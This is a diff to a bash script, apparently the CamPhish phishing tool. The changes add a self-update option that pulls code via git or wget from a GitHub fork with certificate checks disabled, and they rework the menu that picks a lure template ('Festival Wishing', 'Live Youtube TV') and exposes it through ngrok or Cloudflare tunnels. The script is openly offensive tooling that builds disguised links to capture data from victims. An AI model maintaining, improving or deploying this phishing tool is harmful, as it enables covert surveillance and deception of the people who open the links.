@@ -455,7 +455,7 @@ checkfound
 }
 
 payload_ngrok() {
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app' | head -n1)
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
@@ -469,39 +469,83 @@ fi
 rm -rf index3.html
 }
 
+update_tool() {
+printf "\e[1;92m[\e[0m+\e[1;92m] Checking for updates...\n"
+if [[ -d .git ]]; then
+    command -v git > /dev/null 2>&1 || { echo >&2 "I require git but it's not installed. Aborting."; exit 1; }
+    printf "\e[1;92m[\e[0m+\e[1;92m] Fetching latest version from GitHub...\n"
+    git fetch
+    LOCAL=$(git rev-parse @)
+    REMOTE=$(git rev-parse @{u})
+    BASE=$(git merge-base @ @{u})
+
+    if [ "$LOCAL" = "$REMOTE" ]; then
+        printf "\e[1;92m[\e[0m+\e[1;92m] Tool is up to date.\n"
+        sleep 2
+        clear
+        banner
+        camphish
+    elif [ "$LOCAL" = "$BASE" ]; then
+        printf "\e[1;93m[\e[0m!\e[1;93m] New version available! Updating...\n"
+        git pull
+        printf "\e[1;92m[\e[0m+\e[1;92m] Update successful. Please restart the tool.\n"
+        exit 0
+    else
+        printf "\e[1;93m[\e[0m!\e[1;93m] Local changes detected. Please update manually.\n"
+        sleep 2
+        clear
+        banner
+        camphish
+    fi
+else
+    printf "\e[1;93m[\e[0m!\e[1;93m] Not a git repository. Downloading main script...\n"
+    wget --no-check-certificate https://raw.githubusercontent.com/jesusdorian999019/CamPhish-master-v-YISUS/master/camphish.sh -O camphish.sh.new > /dev/null 2>&1
+    if [[ -e camphish.sh.new ]]; then
+        mv camphish.sh.new camphish.sh
+        chmod +x camphish.sh
+        printf "\e[1;92m[\e[0m+\e[1;92m] Script updated successfully. Please restart the tool.\n"
+        exit 0
+    else
+        printf "\e[1;31m[!] Update failed. Check your internet connection.\e[0m\n"
+        sleep 2
+        clear
+        banner
+        camphish
+    fi
+fi
+}
+
 camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
+printf "\n-----Choose an option----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Update Tool\e[0m\n"
 default_option_server="2"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 2] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose an option: [Default is 2] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
-select_template
 
-if [[ $option_server -eq 2 ]]; then
-cloudflare_tunnel
+if [[ $option_server -eq 3 ]]; then
+    update_tool
+elif [[ $option_server -eq 2 ]]; then
+    select_template
+    cloudflare_tunnel
 elif [[ $option_server -eq 1 ]]; then
-ngrok_server
+    select_template
+    ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-camphish
+    printf "\e[1;93m [!] Invalid option!\e[0m\n"
+    sleep 1
+    clear
+    banner
+    camphish
 fi
 }
 
 select_template() {
-if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
-sleep 1
-clear
-banner
-camphish
-else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
@@ -520,7 +564,6 @@ else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
 select_template
-fi
 fi
 }
 
